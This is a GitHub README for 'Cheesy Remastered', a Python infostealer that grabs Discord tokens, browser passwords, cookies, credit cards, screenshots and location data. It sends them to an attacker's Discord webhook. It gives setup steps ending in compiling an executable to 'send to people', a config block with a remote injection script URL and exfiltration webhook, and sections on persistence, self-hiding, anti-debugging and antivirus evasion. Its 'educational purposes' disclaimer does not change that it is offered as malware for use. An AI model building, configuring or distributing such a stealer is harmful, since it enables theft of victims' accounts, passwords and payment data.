<h1 align="center">
  Cheesy Remastered
</h1>

<p align="center"> 
  <kbd>
<img src="https://cdn.kkgmedia.com/pop-cat.gif">
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/last-commit/bananaman2020/cheesy?style=flat-square">
  <img src="https://sonarcloud.io/api/project_badges/measure?project=bananaman2020_cheesy&metric=ncloc"/>
</p>

<h2 align="center">
 Cheesy was made with

K78 ❌ tesco ✅

</h2>

**NOTE:** \
Cheesy was made for educational purposes, therefore all consequences caused by your actions are **your** responsibility and accountability.


---

## <a id="content"></a>🌐 〢 Content

- [🔰・Features](#features)
- [🌌・Discord](https://discord.gg/ys8WBY8VEQ)
- [🎉・Setting up Cheesy](#setup)
- [⚙・Config](#config)
- [🐢・Why is it slower?](#slow)
- [🔎・Why choose Cheesy?](#why_cheese)
- [🌟・Todo/Enhancements](#enhancements)
- [📝・Changelog](#changelog)

## <a id="features"></a>🔰 〢 Features

```
> Anti-vm/Anti-debug
> Improved upon Rdimo's project and added Obfuscation using MSVC
> Add to startup
> Hides itself
> Supports a webhook protector but the old one got removed off github (looking for a replacement, suggestions welcome in the issues tab)
> Options are configurable
> Pretty Fast Even if it Was Made With Python
> Windows Product Key & Build Info
> IP & Geolocation. (Country, City, Google Maps Location)
> A screenshot of all their monitors
> All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
> Their Passwords & Credit Cards for Discord (updates when they change it)
> All Passwords, Cookies and History from Google
> + More!
```

---

## <a id="setup"></a> 📁 〢 Setting up Cheesy

1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
2. Open up [main.py](https://github.com/bananaman2020/cheesy/blob/master/main.py) with notepad or some other editor
3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
4. Double Click `setup.bat` and allow it to finish.
5. Download Visual Studio Community 2022 and get the C++ Development Feature Pack during the installer screen
6. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
7. Wait for the process to complete and then get the file that was made in the downloaded folder and send to people :)

## <a id="config"></a>⚙ 〢 Config

If you want to change the config, open up [main.py](https://github.com/bananaman2020/cheesy/blob/master/main.py) and locate it at the top. There you can configure the following:

```py
config = {
    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
    # Recommend using a webhook protector (when it's fixed)
    'webhook': "WEBHOOK_HERE", # Enter your webhook on this line by replacing "WEBHOOK_HERE"
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING THE TOKEN PROTECTOR # The token protector API I used has been taken off github so use your normal discord webhook for now until I come up with an alternative
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran Cheesy
    'ping_on_run': True,
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': False,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if Cheesy detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
      ...
    ]

}
```

---
## <a id="slow"></a>🐢 〢 Why is it slower to compile now?

well as the new compiler is "Nuitka" it pretty much works by translating python into C++ which is a lengthy process though during my testing on a i7-10700k compiling takes around 5-10minutes

This improves security by a lot. The reason I chose Nuitka is because (A) it's free (B) It obfuscates pretty well

The only con to this is that dropping the file into virustotal or interzer analyze will display a flag that shows "Probably Packed (Suspicious)" This is because Nuitka's unpacker that's in the exe leaves a few traces to the obfuscation method. This is out of my control as it is simply way too complicated to change but for 99.9% of people this won't be an issue.

**UPDATE**
I changed the requirement to be MSVC as it is faster and gets rid of the "Probably Packed (Suspicious) flag on AVs

## <a id="why_cheese"></a>🔎 〢 Why choose Cheesy?

idk i did this so like piss off egirls and shit

Here are some pros and cons why/why not use Cheesy instead of other ones

### ✔ Pros

⁃ Extremely well maintained, making it a safe choice \
⁃ Partly undetected just because it gets updates often \
⁃ Easy to use and setup \
⁃ Completely free and open source \
⁃ Loads of wide spread features not only focused on discord \
⁃ Cleans itself up, deleting all traces of itself which suprisingly most others don't \
⁃ Supports a webhook protector \
⁃ Even thought it's made in python it's very fast thanks to async and threading \
⁃ Clean embed & isn't spammy like others making it less likely to get ratelimited \
⁃ Takes feedback and listens to what people want to be added/changed/removed

### ❌ Cons

⁃ Made in Python making it lose to other grabbers in terms of speed \
⁃ Python is an interpreted language, it needs to pack the engine & all dependencies making the file size very big \
⁃ Only supports windows 10/11 \
⁃ Can be pretty easily decompiled (still harder than Mercurial atleast)

In the end it's just up to **you** to choose what grabber suits you and your needs the best.

---

## <a id="enhancements"></a>🌟 〢 todo/enhancements

~~overlined~~ = feature got added

- Grab Webcam (screenshot?, video?) 
- Fake Error (custom message, type, etc...)
- File dropper (direct payload link, options: hide it? add to startup? drop location?)
- Self spread 
- Grab Wifi passwords 
- Better Anti-vm/Anti-debug (check screen size?, more registery checks?, make the lists outbound?)
- Exe builder (clean gui, toggable options, compress exe (file size <= 8mb), etc...)
- ~~Grab Chrome history~~
- ~~Grab Minecraft accessToken~~
- ~~Grab hwid (for manual blacklisting)~~
- ~~Grab more network info (ip, geolocation, etc...) and put in seperate txt file~~
- ~~General info (OS, CPU, GPU, RAM, etc...) and put in seperate txt file~~

Not adding/on hold:
- .doc/.pdf file grabbing 
- Metamask Priv Key and seed 

---

## <a id="changelog"></a>💭 〢 ChangeLog

```diff
v1.0.5 : 04-12-2022
+ Early Merry Christmas
+ Updated Readme
+ Cleaned up code
- Lost Webhook Protector

v1.0.4 : 24-08-2022
+ Updated EXE Builder to use MSVC (new requirement)
+ Better hidden because of Microsoft's C++ Compiler. Less likely to trigger "Suspicious: Python Packed"

v1.0.3 : 13-08-2022
+ Visual Studio Code added as blacklisted software
+ Injection changed to be more persistent 
- Minor Update

v1.0.2 : 01-08-2022
+ updated exe builder to play nicely with nuitka
- im losing my sanity

v1.0.1 : 01-08-2022
+ nvm fuck pyarmor
+ i love nuitka (new obfuscator)
- pyarmor got fucked in the ass haha L not paying for ur shit

v1.0.0 : 31-07-2022
+ Lost the old source code so rebuilt based off Hazard
+ Will include pyarmor to obfuscate code
```


<br>

<p align="center">
🌟 <b>Enjoyed Cheesy?</b> Consider dropping a star :)
<br>
Upgraded by bananaman2020 based off Rdimo
<br>
<a href=#top>Back to Top</a></p>
